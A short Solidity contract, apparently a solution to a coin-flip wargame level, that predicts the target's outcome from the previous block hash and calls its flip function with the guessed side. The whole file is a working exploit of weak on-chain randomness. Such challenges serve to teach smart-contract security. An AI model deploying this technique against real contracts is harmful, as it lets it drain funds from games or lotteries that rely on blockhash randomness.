// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ICoinFlip.sol";

contract CoinFlipAttacker {
    address public coinFlipAddress;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = _coinFlipAddress;
    }

    function attackFlip() public {
        ICoinFlip coinFlipContract = ICoinFlip(coinFlipAddress);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}